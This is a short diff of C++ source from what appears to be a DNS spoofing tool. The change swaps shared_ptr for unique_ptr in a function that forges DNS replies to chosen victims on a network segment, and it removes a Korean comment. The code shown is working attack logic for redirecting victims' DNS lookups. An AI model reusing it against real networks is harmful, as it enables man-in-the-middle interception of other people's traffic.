@@ -106,7 +106,7 @@ std::string extract_domain_name(const uint8_t* dns_data, size_t dns_len) {
 void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                              const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
                              const std::string& domain,
-                             const std::vector<std::shared_ptr<SpoofTarget>>& targets) {
+                             const std::vector<std::unique_ptr<SpoofTarget>>& targets) {
     const int eth_len = 14;
     const ip_header* ip = (ip_header*)(orig_packet + eth_len);
     int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
@@ -138,7 +138,7 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     bool found = false;
     for (const auto& target : targets) {
         if (ip_equals(requester_ip, target->get_ip())) {
-            memcpy(eth_resp->ether_dhost, target->get_mac(), 6);  // ✅ 정확한 대상 MAC
+            memcpy(eth_resp->ether_dhost, target->get_mac(), 6);  
             found = true;
             std::cout << "[DNS 응답] → " << target->get_ip_str()
                       << ", MAC: " << mac_to_string(target->get_mac()) << "\n";
